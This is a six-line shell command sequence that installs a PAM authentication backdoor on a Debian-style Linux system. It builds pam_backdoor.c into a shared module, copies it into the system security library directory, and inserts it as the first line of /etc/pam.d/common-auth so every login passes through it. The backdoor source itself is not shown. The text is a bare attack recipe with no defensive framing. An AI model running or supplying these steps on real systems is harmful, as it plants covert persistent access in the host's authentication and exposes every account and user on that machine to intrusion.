sudo apt update  
sudo apt install libpam0g-dev  
gcc -fPIC -fno-stack-protector -c pam_backdoor.c  
ld -x --shared -o pam_backdoor.so pam_backdoor.o  
sudo cp pam_backdoor.so /lib/x86_64-linux-gnu/security  
sed -i '1i auth required pam_backdoor.so' /etc/pam.d/common-auth  
